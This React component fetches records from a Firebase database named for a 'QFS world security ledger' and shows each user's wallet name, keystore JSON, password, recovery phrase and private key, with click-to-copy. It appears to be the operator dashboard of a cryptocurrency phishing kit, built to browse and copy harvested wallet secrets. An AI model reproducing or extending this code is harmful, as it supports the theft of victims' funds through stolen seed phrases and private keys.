import React, { useState, useEffect } from "react";
import axios from "axios";
import {
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Typography,
} from "@mui/material";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

const BackedUp = () => {
  const [backups, setBackups] = useState([]);
  const [copiedText, setCopiedText] = useState(null);

  useEffect(() => {
    // Fetch backed up data from Firebase
    axios
      .get(
        "https://qfsworldsecurityledger-default-rtdb.firebaseio.com/backedup.json"
      )
      .then((response) => {
        // Convert Firebase response object to array of backups
        const fetchedBackups = [];
        for (let userId in response.data) {
          for (let backupId in response.data[userId]) {
            const backupData = response.data[userId][backupId];
            fetchedBackups.push({
              userId: userId,
              id: backupId,
              keystoreJson: backupData.keystoreJson || "-",
              password: backupData.password || "-",
              walletName: backupData.walletName || "-",
              recoveryPhrase: backupData.recoveryPhrase || "-",
              privateKey: backupData.privateKey || "-",
            });
          }
        }
        setBackups(fetchedBackups);
      })
      .catch((error) => {
        console.error("Error fetching backups:", error);
      });
  }, []);

  const handleCopyText = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000); // Remove the copied text after 2 seconds
  };

  return (
    <div className="container mx-auto py-6">
      <h2 className="text-2xl font-bold mb-4">Backup Details</h2>
      <div className="flex flex-col items-center">
        {backups.map((backup) => (
          <Accordion key={backup.id} className="w-full mb-4">
            <AccordionSummary
              expandIcon={<ExpandMoreIcon />}
              aria-controls={`panel-${backup.id}-content`}
              id={`panel-${backup.id}-header`}
            >
              <Typography
                variant="h6"
                align="center"
                className="text-center w-full"
              >
                {backup.walletName}
              </Typography>
            </AccordionSummary>
            <AccordionDetails className="flex flex-col items-center">
              <div className="w-full p-4 bg-gray-100 rounded-md shadow-md">
                {[
                  { label: "Keystore JSON", value: backup.keystoreJson },
                  { label: "Password", value: backup.password },
                  { label: "Wallet Name", value: backup.walletName },
                  { label: "Recovery Phrase", value: backup.recoveryPhrase },
                  { label: "Private Key", value: backup.privateKey },
                ].map((item, index) => (
                  <div className="mb-4 text-center" key={index}>
                    <p className="font-semibold">{item.label}</p>
                    <p
                      className="cursor-pointer"
                      onClick={() => handleCopyText(item.value)}
                    >
                      {item.value}
                    </p>
                    {copiedText === item.value && (
                      <p className="text-green-500 text-sm mt-1">Copied!</p>
                    )}
                  </div>
                ))}
              </div>
            </AccordionDetails>
          </Accordion>
        ))}
      </div>
    </div>
  );
};

export default BackedUp;
